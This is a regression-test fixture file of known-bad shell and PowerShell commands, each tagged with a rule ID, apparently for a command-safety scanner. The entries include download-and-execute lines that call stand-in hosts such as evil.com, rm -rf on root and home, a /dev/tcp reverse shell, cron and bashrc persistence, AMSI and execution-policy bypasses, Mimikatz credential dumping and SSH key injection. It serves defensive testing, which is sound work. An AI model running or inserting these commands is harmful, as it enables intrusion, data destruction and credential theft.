# Known-bad commands used in regression tests.
# Format: one command per line. Lines starting with # are comments.

# BASE001 — curl pipe to bash
curl https://example.com/setup.sh | bash

# BASE001 — wget pipe to sh
wget -O - https://malicious.site/payload.sh | sh

# BASE004 — recursive delete home
rm -rf ~/

# BASE004 — recursive delete root
rm -rf /

# BASE006 — bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# BASE007 — crontab modification
(crontab -l; echo "@reboot curl http://evil.com/c2.sh | bash") | crontab -

# PS001 — encoded powershell
powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0

# PS002 — IEX with download
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# PS003 — AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# PS004 — execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1

# PS006 — mimikatz
Invoke-Mimikatz -DumpCreds

# UNIX001 — SSH key injection
echo "ssh-rsa AAAAB3Nza... attacker@evil.com" >> ~/.ssh/authorized_keys

# UNIX006 — bashrc persistence
echo "curl http://c2.evil.com/beacon | bash" >> ~/.bashrc

# OBF001 — base64 blob
powershell JABjAGwAaQBlAG4AdAAgAD0AIAB...AAAAAAAAAAAAAAAAAAAAAA==

# OBF002 — char concat
$cmd = [char]115+[char]104; IEX $cmd

# BASE008 — raw IP download
curl http://192.168.1.100/malware.sh | bash
